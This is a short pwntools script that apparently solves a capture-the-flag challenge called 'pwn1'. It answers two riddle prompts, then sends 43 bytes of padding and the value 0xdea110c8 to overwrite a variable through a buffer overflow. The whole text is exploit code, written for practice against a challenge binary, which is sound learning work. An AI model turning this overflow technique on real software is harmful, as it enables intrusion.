from pwn import *
pad = ''
pad = b"A" * 43
pad += p32(0xdea110c8)

p = process("./pwn1")
p.recvuntil(b"What... is your name?")
p.sendline(b"Sir Lancelot of Camelot")
p.recvuntil(b"What... is your quest?")
p.sendline(b"To seek the Holy Grail.")
p.recvuntil(b"What... is my secret?")
p.sendline(pad)

p.interactive()
